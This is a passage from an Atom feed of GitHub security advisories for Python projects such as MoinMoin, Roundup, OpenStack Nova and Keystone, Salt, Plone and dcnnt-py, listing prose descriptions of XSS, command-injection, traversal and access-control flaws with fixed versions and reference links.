<li><a href="http://moinmo.in/MoinMoinBugs/1.9.2UnescapedInputForThemeAddMsg">http://moinmo.in/MoinMoinBugs/1.9.2UnescapedInputForThemeAddMsg</a></li>
<li><a href="http://moinmo.in/MoinMoinRelease1.8">http://moinmo.in/MoinMoinRelease1.8</a></li>
<li><a href="http://moinmo.in/MoinMoinRelease1.9">http://moinmo.in/MoinMoinRelease1.9</a></li>
<li><a href="http://moinmo.in/SecurityFixes">http://moinmo.in/SecurityFixes</a></li>
<li><a href="http://www.debian.org/security/2010/dsa-2083">http://www.debian.org/security/2010/dsa-2083</a></li>
<li><a href="https://web.archive.org/web/20140801154518/http://secunia.com/advisories/40836">https://web.archive.org/web/20140801154518/http://secunia.com/advisories/40836</a></li>
<li><a href="https://web.archive.org/web/20200228150629/http://www.securityfocus.com/bid/40549">https://web.archive.org/web/20200228150629/http://www.securityfocus.com/bid/40549</a></li>
<li><a href="https://github.com/advisories/GHSA-5m2m-27cg-7v4v">https://github.com/advisories/GHSA-5m2m-27cg-7v4v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5m2m-27cg-7v4v</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-05-17T05:49:23.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[moin] MoinMoin Cross-site Scripting (XSS) vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-5m2m-27cg-7v4v</id>
        <link href="https://github.com/advisories/GHSA-5m2m-27cg-7v4v"/>
        <updated>2024-05-11T05:02:31.000Z</updated>
        <content type="html"><![CDATA[<p>Multiple cross-site scripting (XSS) vulnerabilities in MoinMoin 1.7.3 and earlier, 1.8.x before 1.8.8, and 1.9.x before 1.9.3 allow remote attackers to inject arbitrary web script or HTML via crafted content, related to (1) <code>Page.py</code>, (2) <code>PageEditor.py</code>, (3) <code>PageGraphicalEditor.py</code>, (4) <code>action/CopyPage.py</code>, (5) <code>action/Load.py</code>, (6) <code>action/RenamePage.py</code>, (7) <code>action/backup.py</code>, (8) <code>action/login.py</code>, (9) <code>action/newaccount.py</code>, and (10) <code>action/recoverpass.py</code>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2010-2487">https://nvd.nist.gov/vuln/detail/CVE-2010-2487</a></li>
<li><a href="http://bugs.debian.org/cgi-bin/bugreport.cgi?bug=584809">http://bugs.debian.org/cgi-bin/bugreport.cgi?bug=584809</a></li>
<li><a href="http://hg.moinmo.in/moin/1.7/rev/37306fba2189">http://hg.moinmo.in/moin/1.7/rev/37306fba2189</a></li>
<li><a href="http://hg.moinmo.in/moin/1.8/raw-file/1.8.8/docs/CHANGES">http://hg.moinmo.in/moin/1.8/raw-file/1.8.8/docs/CHANGES</a></li>
<li><a href="http://hg.moinmo.in/moin/1.8/rev/4238b0c90871">http://hg.moinmo.in/moin/1.8/rev/4238b0c90871</a></li>
<li><a href="http://hg.moinmo.in/moin/1.9/raw-file/1.9.3/docs/CHANGES">http://hg.moinmo.in/moin/1.9/raw-file/1.9.3/docs/CHANGES</a></li>
<li><a href="http://hg.moinmo.in/moin/1.9/rev/68ba3cc79513">http://hg.moinmo.in/moin/1.9/rev/68ba3cc79513</a></li>
<li><a href="http://hg.moinmo.in/moin/1.9/rev/e50b087c4572">http://hg.moinmo.in/moin/1.9/rev/e50b087c4572</a></li>
<li><a href="http://marc.info/?l=oss-security&amp;m=127799369406968&amp;w=2">http://marc.info/?l=oss-security&amp;m=127799369406968&amp;w=2</a></li>
<li><a href="http://marc.info/?l=oss-security&amp;m=127809682420259&amp;w=2">http://marc.info/?l=oss-security&amp;m=127809682420259&amp;w=2</a></li>
<li><a href="http://moinmo.in/MoinMoinBugs/1.9.2UnescapedInputForThemeAddMsg">http://moinmo.in/MoinMoinBugs/1.9.2UnescapedInputForThemeAddMsg</a></li>
<li><a href="http://moinmo.in/MoinMoinRelease1.8">http://moinmo.in/MoinMoinRelease1.8</a></li>
<li><a href="http://moinmo.in/MoinMoinRelease1.9">http://moinmo.in/MoinMoinRelease1.9</a></li>
<li><a href="http://moinmo.in/SecurityFixes">http://moinmo.in/SecurityFixes</a></li>
<li><a href="http://www.debian.org/security/2010/dsa-2083">http://www.debian.org/security/2010/dsa-2083</a></li>
<li><a href="https://web.archive.org/web/20140801154518/http://secunia.com/advisories/40836">https://web.archive.org/web/20140801154518/http://secunia.com/advisories/40836</a></li>
<li><a href="https://web.archive.org/web/20200228150629/http://www.securityfocus.com/bid/40549">https://web.archive.org/web/20200228150629/http://www.securityfocus.com/bid/40549</a></li>
<li><a href="https://github.com/advisories/GHSA-5m2m-27cg-7v4v">https://github.com/advisories/GHSA-5m2m-27cg-7v4v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5m2m-27cg-7v4v</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-05-17T05:49:23.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[roundup] Roundup Cross-site Scripting (XSS) vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-frgf-rv99-862x</id>
        <link href="https://github.com/advisories/GHSA-frgf-rv99-862x"/>
        <updated>2024-05-11T05:02:31.000Z</updated>
        <content type="html"><![CDATA[<p>Cross-site scripting (XSS) vulnerability in <code>cgi/client.py</code> in Roundup before 1.4.14 allows remote attackers to inject arbitrary web script or HTML via the template argument to the /issue program.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2010-2491">https://nvd.nist.gov/vuln/detail/CVE-2010-2491</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=610861">https://bugzilla.redhat.com/show_bug.cgi?id=610861</a></li>
<li><a href="http://bugs.gentoo.org/show_bug.cgi?id=326395">http://bugs.gentoo.org/show_bug.cgi?id=326395</a></li>
<li><a href="http://issues.roundup-tracker.org/issue2550654">http://issues.roundup-tracker.org/issue2550654</a></li>
<li><a href="http://lists.fedoraproject.org/pipermail/package-announce/2010-September/048018.html">http://lists.fedoraproject.org/pipermail/package-announce/2010-September/048018.html</a></li>
<li><a href="http://lists.fedoraproject.org/pipermail/package-announce/2010-September/048061.html">http://lists.fedoraproject.org/pipermail/package-announce/2010-September/048061.html</a></li>
<li><a href="http://lists.fedoraproject.org/pipermail/package-announce/2010-September/048221.html">http://lists.fedoraproject.org/pipermail/package-announce/2010-September/048221.html</a></li>
<li><a href="http://roundup.svn.sourceforge.net/viewvc/roundup/roundup/trunk/roundup/cgi/client.py?r1=4486&amp;r2=4485&amp;pathrev=4486">http://roundup.svn.sourceforge.net/viewvc/roundup/roundup/trunk/roundup/cgi/client.py?r1=4486&amp;r2=4485&amp;pathrev=4486</a></li>
<li><a href="http://roundup.svn.sourceforge.net/viewvc/roundup?view=revision&amp;revision=4486">http://roundup.svn.sourceforge.net/viewvc/roundup?view=revision&amp;revision=4486</a></li>
<li><a href="http://sourceforge.net/mailarchive/message.php?msg_name=AANLkTimIYtyRzTAReGmTSCEqPYBvwkkxrP6YKrdVm_nU%40mail.gmail.com">http://sourceforge.net/mailarchive/message.php?msg_name=AANLkTimIYtyRzTAReGmTSCEqPYBvwkkxrP6YKrdVm_nU%40mail.gmail.com</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2010/07/02/12">http://www.openwall.com/lists/oss-security/2010/07/02/12</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2010/07/02/3">http://www.openwall.com/lists/oss-security/2010/07/02/3</a></li>
<li><a href="https://github.com/roundup-tracker/roundup/commit/dcef024bae8f63d290454250767a377eb0e1647b">https://github.com/roundup-tracker/roundup/commit/dcef024bae8f63d290454250767a377eb0e1647b</a></li>
<li><a href="https://web.archive.org/web/20111225190151/http://secunia.com/advisories/41585">https://web.archive.org/web/20111225190151/http://secunia.com/advisories/41585</a></li>
<li><a href="https://web.archive.org/web/20140725071254/http://secunia.com/advisories/40433">https://web.archive.org/web/20140725071254/http://secunia.com/advisories/40433</a></li>
<li><a href="https://web.archive.org/web/20200228183400/http://www.securityfocus.com/bid/41326">https://web.archive.org/web/20200228183400/http://www.securityfocus.com/bid/41326</a></li>
<li><a href="https://github.com/advisories/GHSA-frgf-rv99-862x">https://github.com/advisories/GHSA-frgf-rv99-862x</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-frgf-rv99-862x</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-05-17T05:28:58.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[dcnnt] dcnnt-py is vulnerable to command injection via Notification Handler]]></title>
        <id>https://github.com/advisories/GHSA-8p42-7597-p2f6</id>
        <link href="https://github.com/advisories/GHSA-8p42-7597-p2f6"/>
        <updated>2024-05-10T05:03:05.000Z</updated>
        <content type="html"><![CDATA[<p>A vulnerability was found in cyanomiko dcnnt-py up to 0.9.0. It has been classified as critical. Affected is the function main of the file dcnnt/plugins/notifications.py of the component Notification Handler. The manipulation leads to command injection. It is possible to launch the attack remotely. Upgrading to version 0.9.1 is able to address this issue. The patch is identified as b4021d784a97e25151a5353aa763a741e9a148f5. It is recommended to upgrade the affected component. VDB-262230 is the identifier assigned to this vulnerability.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-1000">https://nvd.nist.gov/vuln/detail/CVE-2023-1000</a></li>
<li><a href="https://github.com/cyanomiko/dcnnt-py/pull/23">https://github.com/cyanomiko/dcnnt-py/pull/23</a></li>
<li><a href="https://github.com/cyanomiko/dcnnt-py/commit/b4021d784a97e25151a5353aa763a741e9a148f5">https://github.com/cyanomiko/dcnnt-py/commit/b4021d784a97e25151a5353aa763a741e9a148f5</a></li>
<li><a href="https://github.com/cyanomiko/dcnnt-py/releases/tag/0.9.1">https://github.com/cyanomiko/dcnnt-py/releases/tag/0.9.1</a></li>
<li><a href="https://vuldb.com/?ctiid.262230">https://vuldb.com/?ctiid.262230</a></li>
<li><a href="https://vuldb.com/?id.262230">https://vuldb.com/?id.262230</a></li>
<li><a href="https://github.com/advisories/GHSA-8p42-7597-p2f6">https://github.com/advisories/GHSA-8p42-7597-p2f6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8p42-7597-p2f6</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-04-27T09:30:33.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[salt] SaltStack insecurely uses /tmp]]></title>
        <id>https://github.com/advisories/GHSA-qr3x-v97p-42xw</id>
        <link href="https://github.com/advisories/GHSA-qr3x-v97p-42xw"/>
        <updated>2024-05-10T05:03:02.000Z</updated>
        <content type="html"><![CDATA[<p>Unspecified vulnerability in salt-ssh in Salt (aka SaltStack) 0.17.0 has unspecified impact and vectors related to "insecure Usage of /tmp."</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2013-4437">https://nvd.nist.gov/vuln/detail/CVE-2013-4437</a></li>
<li><a href="http://docs.saltstack.com/topics/releases/0.17.1.html">http://docs.saltstack.com/topics/releases/0.17.1.html</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2013/10/18/3">http://www.openwall.com/lists/oss-security/2013/10/18/3</a></li>
<li><a href="https://github.com/advisories/GHSA-qr3x-v97p-42xw">https://github.com/advisories/GHSA-qr3x-v97p-42xw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qr3x-v97p-42xw</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-05-17T04:58:29.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Keystone] OpenStack Keystone allows context-dependent attackers to bypass access restrictions]]></title>
        <id>https://github.com/advisories/GHSA-8833-qrvm-wc3h</id>
        <link href="https://github.com/advisories/GHSA-8833-qrvm-wc3h"/>
        <updated>2024-05-09T16:47:06.000Z</updated>
        <content type="html"><![CDATA[<p>OpenStack Keystone Grizzly before 2013.1, Folsom 2012.1.3 and earlier, and Essex does not properly check if the (1) user, (2) tenant, or (3) domain is enabled when using EC2-style authentication, which allows context-dependent attackers to bypass access restrictions.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2013-0282">https://nvd.nist.gov/vuln/detail/CVE-2013-0282</a></li>
<li><a href="https://bugs.launchpad.net/keystone/+bug/1121494">https://bugs.launchpad.net/keystone/+bug/1121494</a></li>
<li><a href="https://launchpad.net/keystone/+milestone/2012.2.4">https://launchpad.net/keystone/+milestone/2012.2.4</a></li>
<li><a href="https://launchpad.net/keystone/grizzly/2013.1">https://launchpad.net/keystone/grizzly/2013.1</a></li>
<li><a href="https://review.openstack.org/#/c/22319/">https://review.openstack.org/#/c/22319/</a></li>
<li><a href="https://review.openstack.org/#/c/22320/">https://review.openstack.org/#/c/22320/</a></li>
<li><a href="https://review.openstack.org/#/c/22321/">https://review.openstack.org/#/c/22321/</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2013/02/19/3">http://www.openwall.com/lists/oss-security/2013/02/19/3</a></li>
<li><a href="https://github.com/openstack/keystone/commit/7402f5ef994599653bdbb3ed5ff1a2b8c3e72b9f">https://github.com/openstack/keystone/commit/7402f5ef994599653bdbb3ed5ff1a2b8c3e72b9f</a></li>
<li><a href="https://github.com/openstack/keystone/commit/9572bfc393f66f5ce3b44c0a77a9e29cc0374c6f">https://github.com/openstack/keystone/commit/9572bfc393f66f5ce3b44c0a77a9e29cc0374c6f</a></li>
<li><a href="https://github.com/openstack/keystone/commit/f0b4d300db5cc61d4f079f8bce9da8e8bea1081a">https://github.com/openstack/keystone/commit/f0b4d300db5cc61d4f079f8bce9da8e8bea1081a</a></li>
<li><a href="https://github.com/advisories/GHSA-8833-qrvm-wc3h">https://github.com/advisories/GHSA-8833-qrvm-wc3h</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8833-qrvm-wc3h</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-05-05T02:48:43.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Nova] OpenStack Compute Nova Unauthorised access to arbitrary VM using VNC token from deleted VM]]></title>
        <id>https://github.com/advisories/GHSA-qfp8-hfqx-c79c</id>
        <link href="https://github.com/advisories/GHSA-qfp8-hfqx-c79c"/>
        <updated>2024-05-09T16:15:04.000Z</updated>
        <content type="html"><![CDATA[<p>OpenStack Compute (Nova) Grizzly, Folsom (2012.2), and Essex (2012.1) allows remote authenticated users to gain access to a VM in opportunistic circumstances by using the VNC token for a deleted VM that was bound to the same VNC port.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2013-0335">https://nvd.nist.gov/vuln/detail/CVE-2013-0335</a></li>
<li><a href="https://bugs.launchpad.net/nova/+bug/1125378">https://bugs.launchpad.net/nova/+bug/1125378</a></li>
<li><a href="https://review.openstack.org/#/c/22086/">https://review.openstack.org/#/c/22086/</a></li>
<li><a href="https://review.openstack.org/#/c/22758">https://review.openstack.org/#/c/22758</a></li>
<li><a href="https://review.openstack.org/#/c/22872/">https://review.openstack.org/#/c/22872/</a></li>
<li><a href="http://rhn.redhat.com/errata/RHSA-2013-0709.html">http://rhn.redhat.com/errata/RHSA-2013-0709.html</a></li>
<li><a href="http://secunia.com/advisories/52337">http://secunia.com/advisories/52337</a></li>
<li><a href="http://secunia.com/advisories/52728">http://secunia.com/advisories/52728</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2013/02/26/7">http://www.openwall.com/lists/oss-security/2013/02/26/7</a></li>
<li><a href="http://www.osvdb.org/90657">http://www.osvdb.org/90657</a></li>
<li><a href="http://www.ubuntu.com/usn/USN-1771-1">http://www.ubuntu.com/usn/USN-1771-1</a></li>
<li><a href="http://github.com/openstack/nova/commit/05a3374992bc8ba53ddc9c491b51c4b59eed0a72">http://github.com/openstack/nova/commit/05a3374992bc8ba53ddc9c491b51c4b59eed0a72</a></li>
<li><a href="http://github.com/openstack/nova/commit/3b0f4cf6bea33e6ee1893f6e872d968b0c309f88">http://github.com/openstack/nova/commit/3b0f4cf6bea33e6ee1893f6e872d968b0c309f88</a></li>
<li><a href="http://github.com/openstack/nova/commit/48e81f1554ce41c3d4f7445421d19f4a8128e98d">http://github.com/openstack/nova/commit/48e81f1554ce41c3d4f7445421d19f4a8128e98d</a></li>
<li><a href="http://github.com/openstack/nova/commit/ad94a90202193335f011888db017e557b07faf8a">http://github.com/openstack/nova/commit/ad94a90202193335f011888db017e557b07faf8a</a></li>
<li><a href="http://github.com/openstack/nova/commit/e98928cf77645fdc309da894f3bd332e99482e0d">http://github.com/openstack/nova/commit/e98928cf77645fdc309da894f3bd332e99482e0d</a></li>
<li><a href="https://github.com/advisories/GHSA-qfp8-hfqx-c79c">https://github.com/advisories/GHSA-qfp8-hfqx-c79c</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qfp8-hfqx-c79c</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-05-05T02:48:49.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Plone] Plone allows anonymous users to reset any users password through the web via Password Reset Tool]]></title>
        <id>https://github.com/advisories/GHSA-5hch-v5pq-x4qp</id>
        <link href="https://github.com/advisories/GHSA-5hch-v5pq-x4qp"/>
        <updated>2024-05-09T16:14:09.000Z</updated>
        <content type="html"><![CDATA[<p>Unspecified vulnerability in the Password Reset Tool before 0.4.1 on Plone 2.5 and 2.5.1 Release Candidate allows attackers to reset the passwords of other users, related to "an erroneous security declaration."</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2006-4247">https://nvd.nist.gov/vuln/detail/CVE-2006-4247</a></li>
<li><a href="http://plone.org/about/security/advisories/cve-2006-4247">http://plone.org/about/security/advisories/cve-2006-4247</a></li>
<li><a href="https://github.com/advisories/GHSA-5hch-v5pq-x4qp">https://github.com/advisories/GHSA-5hch-v5pq-x4qp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5hch-v5pq-x4qp</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-05-01T07:16:48.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Moin] MoinMoin Improper Access Control ]]></title>
        <id>https://github.com/advisories/GHSA-v744-h36c-hv5j</id>
        <link href="https://github.com/advisories/GHSA-v744-h36c-hv5j"/>
        <updated>2024-05-09T16:13:28.000Z</updated>
        <content type="html"><![CDATA[<p>Unknown vulnerability in MoinMoin 1.2.2 and earlier allows remote attackers to gain unauthorized access to administrator functions such as (1) revert and (2) delete.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2004-1462">https://nvd.nist.gov/vuln/detail/CVE-2004-1462</a></li>
<li><a href="https://exchange.xforce.ibmcloud.com/vulnerabilities/16833">https://exchange.xforce.ibmcloud.com/vulnerabilities/16833</a></li>
<li><a href="https://sourceforge.net/project/shownotes.php?group_id=8482&amp;release_id=254801">https://sourceforge.net/project/shownotes.php?group_id=8482&amp;release_id=254801</a></li>
<li><a href="http://www.gentoo.org/security/en/glsa/glsa-200408-25.xml">http://www.gentoo.org/security/en/glsa/glsa-200408-25.xml</a></li>
<li><a href="http://www.osvdb.org/displayvuln.php?osvdb_id=8194">http://www.osvdb.org/displayvuln.php?osvdb_id=8194</a></li>
<li><a href="http://www.securityfocus.com/bid/10805">http://www.securityfocus.com/bid/10805</a></li>
<li><a href="https://github.com/advisories/GHSA-v744-h36c-hv5j">https://github.com/advisories/GHSA-v744-h36c-hv5j</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v744-h36c-hv5j</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-04-29T02:59:37.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Roundup] Roundup Directory traversal vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-q7mf-hp9m-cx6f</id>
        <link href="https://github.com/advisories/GHSA-q7mf-hp9m-cx6f"/>
        <updated>2024-05-09T16:05:52.000Z</updated>
        <content type="html"><![CDATA[<p>Directory traversal vulnerability in Roundup 0.6.4 and earlier allows remote attackers to view arbitrary files via <code>..</code> (dot dot) sequences in an <code>@@</code> command in an HTTP GET request.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2004-1444">https://nvd.nist.gov/vuln/detail/CVE-2004-1444</a></li>
<li><a href="https://exchange.xforce.ibmcloud.com/vulnerabilities/16350">https://exchange.xforce.ibmcloud.com/vulnerabilities/16350</a></li>
<li><a href="http://packetstormsecurity.nl/0406-exploits/roundUP.txt">http://packetstormsecurity.nl/0406-exploits/roundUP.txt</a></li>
<li><a href="http://securitytracker.com/id?1010415">http://securitytracker.com/id?1010415</a></li>
<li><a href="http://sourceforge.net/tracker/index.php?func=detail&amp;aid=961511&amp;group_id=31577&amp;atid=402788">http://sourceforge.net/tracker/index.php?func=detail&amp;aid=961511&amp;group_id=31577&amp;atid=402788</a></li>
<li><a href="http://www.gentoo.org/security/en/glsa/glsa-200408-09.xml">http://www.gentoo.org/security/en/glsa/glsa-200408-09.xml</a></li>
<li><a href="http://www.securityfocus.com/bid/10495">http://www.securityfocus.com/bid/10495</a></li>
<li><a href="http://secunia.com/advisories/11801">http://secunia.com/advisories/11801</a></li>
<li><a href="https://github.com/advisories/GHSA-q7mf-hp9m-cx6f">https://github.com/advisories/GHSA-q7mf-hp9m-cx6f</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-q7mf-hp9m-cx6f</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-04-29T02:59:35.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Moin] MoinMoin allows administrative access]]></title>
        <id>https://github.com/advisories/GHSA-7jrp-r6jx-32cw</id>
        <link href="https://github.com/advisories/GHSA-7jrp-r6jx-32cw"/>
        <updated>2024-05-09T16:05:00.000Z</updated>
        <content type="html"><![CDATA[<p>MoinMoin 1.2.1 and earlier allows remote attackers to gain privileges by creating a user with the same name as an existing group that has higher privileges.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2004-0708">https://nvd.nist.gov/vuln/detail/CVE-2004-0708</a></li>
<li><a href="https://exchange.xforce.ibmcloud.com/vulnerabilities/16465">https://exchange.xforce.ibmcloud.com/vulnerabilities/16465</a></li>
<li><a href="http://secunia.com/advisories/11807">http://secunia.com/advisories/11807</a></li>
<li><a href="http://sourceforge.net/tracker/index.php?func=detail&amp;aid=948103&amp;group_id=8482&amp;atid=108482">http://sourceforge.net/tracker/index.php?func=detail&amp;aid=948103&amp;group_id=8482&amp;atid=108482</a></li>
<li><a href="http://www.gentoo.org/security/en/glsa/glsa-200407-09.xml">http://www.gentoo.org/security/en/glsa/glsa-200407-09.xml</a></li>
<li><a href="http://www.osvdb.org/6704">http://www.osvdb.org/6704</a></li>
<li><a href="http://www.securityfocus.com/bid/10568">http://www.securityfocus.com/bid/10568</a></li>
<li><a href="https://github.com/advisories/GHSA-7jrp-r6jx-32cw">https://github.com/advisories/GHSA-7jrp-r6jx-32cw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7jrp-r6jx-32cw</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-04-29T02:58:13.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[nova] Openstack nova qcow format could expose host filesystem information]]></title>
        <id>https://github.com/advisories/GHSA-hqfx-4x4w-vmwp</id>
        <link href="https://github.com/advisories/GHSA-hqfx-4x4w-vmwp"/>
        <updated>2024-05-09T15:59:28.000Z</updated>
        <content type="html"><![CDATA[<p>Versions of nova before 2012.1 could expose hypervisor host files to a guest operating system when processing a maliciously constructed qcow filesystem.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2011-3147">https://nvd.nist.gov/vuln/detail/CVE-2011-3147</a></li>
<li><a href="http://bazaar.launchpad.net/~hudson-openstack/nova/trunk/revision/1604">http://bazaar.launchpad.net/~hudson-openstack/nova/trunk/revision/1604</a></li>
<li><a href="https://github.com/openstack/nova/commit/ff9d353b2f4fee469e530fbc8dc231a41f6fed84">https://github.com/openstack/nova/commit/ff9d353b2f4fee469e530fbc8dc231a41f6fed84</a></li>
<li><a href="https://bugs.launchpad.net/nova/+bug/853330">https://bugs.launchpad.net/nova/+bug/853330</a></li>
<li><a href="https://github.com/advisories/GHSA-hqfx-4x4w-vmwp">https://github.com/advisories/GHSA-hqfx-4x4w-vmwp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hqfx-4x4w-vmwp</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2022-04-22T00:24:07.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Nova] OpenStack Nova can leak consoleauth token into log files]]></title>
        <id>https://github.com/advisories/GHSA-22jm-4hxw-35jf</id>
        <link href="https://github.com/advisories/GHSA-22jm-4hxw-35jf"/>
        <updated>2024-05-09T15:57:27.000Z</updated>
        <content type="html"><![CDATA[<p>An issue was discovered in OpenStack Nova before 18.2.4, 19.x before 19.1.0, and 20.x before 20.1.0. It can leak consoleauth tokens into log files. An attacker with read access to the service's logs may obtain tokens used for console access. All Nova setups using novncproxy are affected. This is related to <code>NovaProxyRequestHandlerBase.new_websocket_client</code> in <code>console/websocketproxy.py</code>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2015-9543">https://nvd.nist.gov/vuln/detail/CVE-2015-9543</a></li>
<li><a href="https://launchpad.net/bugs/1492140">https://launchpad.net/bugs/1492140</a></li>
<li><a href="https://review.opendev.org/220622">https://review.opendev.org/220622</a></li>
<li><a href="https://security.openstack.org/ossa/OSSA-2020-001.html">https://security.openstack.org/ossa/OSSA-2020-001.html</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2020/02/19/2">http://www.openwall.com/lists/oss-security/2020/02/19/2</a></li>
<li><a href="https://github.com/openstack/nova/commit/08f1f914cc219cf526adfb08c46b8f40b4e78232">https://github.com/openstack/nova/commit/08f1f914cc219cf526adfb08c46b8f40b4e78232</a></li>
<li><a href="https://github.com/openstack/nova/commit/26d4047e17eba9bc271f8868f1d0ffeec97b555e">https://github.com/openstack/nova/commit/26d4047e17eba9bc271f8868f1d0ffeec97b555e</a></li>
<li><a href="https://github.com/openstack/nova/commit/d8fbf04f325f593836f8d44b6bbf42b85bde94e3">https://github.com/openstack/nova/commit/d8fbf04f325f593836f8d44b6bbf42b85bde94e3</a></li>
<li><a href="https://github.com/advisories/GHSA-22jm-4hxw-35jf">https://github.com/advisories/GHSA-22jm-4hxw-35jf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-22jm-4hxw-35jf</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2022-05-24T17:09:18.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Nova] OpenStack Nova can leak consoleauth token into log files]]></title>
        <id>https://github.com/advisories/GHSA-22jm-4hxw-35jf</id>
        <link href="https://github.com/advisories/GHSA-22jm-4hxw-35jf"/>
        <updated>2024-05-09T15:57:27.000Z</updated>
        <content type="html"><![CDATA[<p>An issue was discovered in OpenStack Nova before 18.2.4, 19.x before 19.1.0, and 20.x before 20.1.0. It can leak consoleauth tokens into log files. An attacker with read access to the service's logs may obtain tokens used for console access. All Nova setups using novncproxy are affected. This is related to <code>NovaProxyRequestHandlerBase.new_websocket_client</code> in <code>console/websocketproxy.py</code>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2015-9543">https://nvd.nist.gov/vuln/detail/CVE-2015-9543</a></li>
<li><a href="https://launchpad.net/bugs/1492140">https://launchpad.net/bugs/1492140</a></li>
<li><a href="https://review.opendev.org/220622">https://review.opendev.org/220622</a></li>
<li><a href="https://security.openstack.org/ossa/OSSA-2020-001.html">https://security.openstack.org/ossa/OSSA-2020-001.html</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2020/02/19/2">http://www.openwall.com/lists/oss-security/2020/02/19/2</a></li>
<li><a href="https://github.com/openstack/nova/commit/08f1f914cc219cf526adfb08c46b8f40b4e78232">https://github.com/openstack/nova/commit/08f1f914cc219cf526adfb08c46b8f40b4e78232</a></li>
<li><a href="https://github.com/openstack/nova/commit/26d4047e17eba9bc271f8868f1d0ffeec97b555e">https://github.com/openstack/nova/commit/26d4047e17eba9bc271f8868f1d0ffeec97b555e</a></li>
